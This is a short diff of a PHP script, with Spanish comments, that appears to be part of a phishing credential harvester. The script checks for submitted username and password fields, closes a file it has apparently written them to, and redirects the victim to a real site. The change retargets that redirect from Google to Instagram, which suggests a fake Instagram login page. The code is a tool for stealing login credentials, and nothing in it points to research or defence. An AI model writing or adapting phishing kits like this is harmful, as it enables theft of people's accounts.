@@ -9,7 +9,7 @@ if (isset($_POST['username']) && isset($_POST['password'])) {
     fclose($file);
 
     // Redireccionar a una página legítima (opcional)
-    header("Location: https://www.google.com");
+    header("Location: https://www.instagram.com/");
     exit();
 }
 ?>
